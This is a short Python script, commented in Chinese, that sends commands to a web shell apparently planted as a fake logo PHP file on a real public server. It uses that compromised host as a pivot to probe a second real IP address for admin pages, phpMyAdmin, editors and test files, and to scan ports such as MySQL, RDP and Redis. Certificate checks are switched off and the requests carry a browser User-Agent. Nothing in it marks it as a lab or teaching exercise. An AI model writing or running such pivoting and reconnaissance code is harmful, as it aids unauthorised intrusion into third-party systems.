#!/usr/bin/env python3
"""通过121探测39.105.7.208:8980"""
import urllib.request, ssl, json, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
W = "http://121.196.233.2:88/uploads/logo_1785428056.php?cmd="

def exec_cmd(cmd):
    try:
        req = urllib.request.Request(W + urllib.parse.quote(cmd), headers={"User-Agent":"Mozilla/5.0"})
        r = urllib.request.urlopen(req, timeout=40, context=ctx)
        body = r.read().decode("utf-8","ignore")
        # 清理HTML
        import re
        body = re.sub(r'<br\s*/?>', '\n', body)
        body = re.sub(r'<[^>]+>', '', body)
        return body.strip()
    except Exception as e:
        return f"ERR:{str(e)[:40]}"

import urllib.parse

# 1. 路径探测
for p in ["/", "/l.php", "/phpinfo.php", "/phpmyadmin/", "/upload/", "/uploads/",
          "/editor/", "/ueditor/", "/kindeditor/", "/admin/", "/admin.php",
          "/test.php", "/1.php", "/x.php", "/index.php", "/web/", "/site/"]:
    cmd = f"curl -s -o /tmp/pp.html -w '%{{http_code}}:%{{size_download}}' 'http://39.105.7.208:8980{p}'"
    r = exec_cmd(cmd)
    if r and "ERR" not in r:
        print(f"{p}: {r}", flush=True)

# 2. 端口再确认
for port in [80, 443, 8980, 3306, 3389, 8888, 8080, 6379]:
    cmd = f"python3 -c \"import socket; s=socket.socket(); s.settimeout(2); r=s.connect_ex(('39.105.7.208',{port})); print({port}, 'OPEN' if r==0 else 'closed'); s.close()\""
    r = exec_cmd(cmd)
    if r and "OPEN" in r:
        print(f"PORT {port} OPEN", flush=True)
